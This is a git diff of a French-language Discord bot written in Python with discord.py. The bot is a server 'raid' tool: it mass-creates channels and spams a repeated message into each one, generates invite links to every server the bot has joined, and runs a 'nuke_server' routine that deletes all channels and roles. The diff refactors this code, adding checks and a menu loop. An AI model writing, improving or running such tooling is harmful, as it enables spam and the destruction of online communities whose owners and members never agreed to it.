@@ -17,23 +17,50 @@ async def create_and_send_message(guild, channel_name, message, index, repeat_co
     channel = await guild.create_text_channel(f"{channel_name}-{index}")
     print(f"Salon '{channel.name}' créé dans le serveur {guild.name}")
 
-    for _ in range(repeat_count):
-        await channel.send(message)
-        await asyncio.sleep(0.5)  # Attendre 0.5 secondes entre chaque envoi
+    if message.strip():  # Vérifie si le message n'est pas vide
+        for _ in range(repeat_count):
+            await channel.send(message)
+            await asyncio.sleep(0.5)  # Attendre 0.5 secondes entre chaque envoi
+    else:
+        print(f"Message vide pour le salon '{channel.name}', aucun message envoyé.")
 
 async def list_servers():
     print("Affichage des serveurs et invitations :")
     for guild in client.guilds:
-        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
-        print(f"Nom du serveur : {guild.name}")
-        print(f"ID du serveur : {guild.id}")
-        print(f"Invitation : {invite.url}")
-        print("--------------------------")
+        if guild.text_channels:  # Vérifie s'il y a des salons textuels
+            invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
+            print(f"Nom du serveur : {guild.name}")
+            print(f"ID du serveur : {guild.id}")
+            print(f"Invitation : {invite.url}")
+            print("--------------------------")
+        else:
+            print(f"Le serveur '{guild.name}' n'a pas de salons textuels.")
+            print("--------------------------")
 
-@client.event
-async def on_ready():
-    print(f"Bot connecté en tant que {client.user}")
+async def nuke_server(guild):
+    print(f"En train de nettoyer le serveur {guild.name} ...")
 
+    # Effacer tous les salons textuels
+    for channel in guild.text_channels:
+        try:
+            await channel.delete()
+        except discord.Forbidden:
+            print(f"Impossible de supprimer le salon {channel.name} car le bot n'a pas les permissions nécessaires.")
+        except Exception as e:
+            print(f"Une erreur s'est produite lors de la suppression du salon {channel.name} : {e}")
+
+    # Effacer tous les rôles
+    for role in guild.roles:
+        try:
+            await role.delete()
+        except discord.Forbidden:
+            print(f"Impossible de supprimer le rôle {role.name} car le bot n'a pas les permissions nécessaires.")
+        except discord.HTTPException as e:
+            print(f"Une erreur s'est produite lors de la suppression du rôle {role.name} : {e}")
+
+    print(f"Nettoyage terminé pour le serveur {guild.name}.")
+
+async def main_menu():
     while True:
         print("\nBienvenue ! Voici les options disponibles :")
         print("1. Spam de serveur")
@@ -96,28 +123,10 @@ async def on_ready():
         else:
             print("Choix invalide. Veuillez entrer 1, 2 ou 3.")
 
-async def nuke_server(guild):
-    print(f"En train de nettoyer le serveur {guild.name} ...")
-
-    # Effacer tous les salons textuels
-    for channel in guild.text_channels:
-        try:
-            await channel.delete()
-        except discord.Forbidden:
-            print(f"Impossible de supprimer le salon {channel.name} car le bot n'a pas les permissions nécessaires.")
-        except Exception as e:
-            print(f"Une erreur s'est produite lors de la suppression du salon {channel.name} : {e}")
-
-    # Effacer tous les rôles
-    for role in guild.roles:
-        try:
-            await role.delete()
-        except discord.Forbidden:
-            print(f"Impossible de supprimer le rôle {role.name} car le bot n'a pas les permissions nécessaires.")
-        except Exception as e:
-            print(f"Une erreur s'est produite lors de la suppression du rôle {role.name} : {e}")
-
-    print(f"Nettoyage terminé pour le serveur {guild.name}.")
+@client.event
+async def on_ready():
+    print(f"Bot connecté en tant que {client.user}")
+    await main_menu()
 
 if __name__ == "__main__":
     token = input("Entrez le token du bot : ")
